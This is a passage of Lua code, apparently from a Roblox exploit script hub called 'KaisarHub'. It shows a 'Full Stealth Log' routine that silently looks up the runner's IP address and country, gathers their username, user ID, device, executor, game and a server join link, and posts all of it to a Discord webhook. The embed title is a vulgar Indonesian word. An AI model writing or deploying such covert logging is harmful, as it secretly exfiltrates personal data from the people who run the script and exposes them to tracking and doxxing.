        end
    end)

    -- IP / country (best + accurate using ipwho.is)
    local ip = "N/A"
    local country = "N/A"
    if req then
        pcall(function()
            local r = req({
                Url = "https://ipwho.is/",
                Method = "GET"
            })
            local body = r and (r.Body or r.body)
            if body then
                local data = nil
                pcall(function() data = httpSvc:JSONDecode(body) end)
                if data and data.ip then
                    ip = data.ip
                end
                if data and data.country then
                    country = data.country
                end
            end
        end)
    end

    -- place / job info & server join link
    local placeId = tostring(game.PlaceId or "0")
    local jobId = tostring(game.JobId or "Unknown")
    -- common join link pattern (works in many contexts)
    local serverLink = "https://www.roblox.com/games/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId

    -- detect device (best-effort)
    local device = "Unknown"
    pcall(function()
        local uis = game:GetService("UserInputService")
        -- try GetPlatform() if available
        if uis and uis.GetPlatform then
            local ok, p = pcall(function() return uis:GetPlatform() end)
            if ok and p then
                device = tostring(p)
            end
        end

        -- fallback heuristics
        if device == "Unknown" then
            local parts = {}
            if uis.TouchEnabled then table.insert(parts, "Touch") end
            if uis.KeyboardEnabled then table.insert(parts, "Keyboard") end
            if #parts > 0 then device = table.concat(parts, "/") end
        end

        -- normalize some common names
        if device:lower():find("windows") or device:lower():find("mac") or device:lower():find("linux") then
            device = "PC/Laptop"
        elseif device:lower():find("android") then
            device = "Android"
        elseif device:lower():find("ios") or device:lower():find("iphone") or device:lower():find("ipad") then
            device = "iOS/iPad"
        end
    end)

    -- game name (best-effort)
    local placeName = "Unknown"
    pcall(function()
        local mps = game:GetService("MarketplaceService")
        placeName = mps:GetProductInfo(game.PlaceId).Name
    end)

    -- build embed
    local embed = {
        title = "Memek!",
        description = "Ada yang menjalankan script anda!",
        color = 0xFF00D6,
        fields = {
            { name = "Username", value = tostring(name), inline = true },
            { name = "User ID", value = tostring(userid), inline = true },
            { name = "Executor", value = tostring(executorName), inline = false },
            { name = "Device", value = tostring(device), inline = true },
            { name = "IP Address", value = "`" .. tostring(ip) .. "`", inline = true },
            { name = "Country", value = tostring(country), inline = true },
            { name = "Game", value = tostring(placeName) .. " (PlaceId: " .. placeId .. ")", inline = false },
            { name = "Server (click to join)", value = "[" .. jobId .. "](" .. serverLink .. ")", inline = false },
            { name = "Players", value = tostring(#Players:GetPlayers()), inline = true },
            { name = "Time (UTC)", value = os.date("!%Y-%m-%d %H:%M:%SZ"), inline = true },
        },
        footer = { text = "KaisarHub • Full Stealth Log" },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = httpSvc:JSONEncode({ embeds = { embed } })

    if req then
        pcall(function()
            req({
                Url = DISCORD_WEBHOOK,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = payload
            })
        end)
    else
        pcall(function()
            httpSvc:PostAsync(DISCORD_WEBHOOK, payload, Enum.HttpContentType.ApplicationJson)
        end)
    end
end

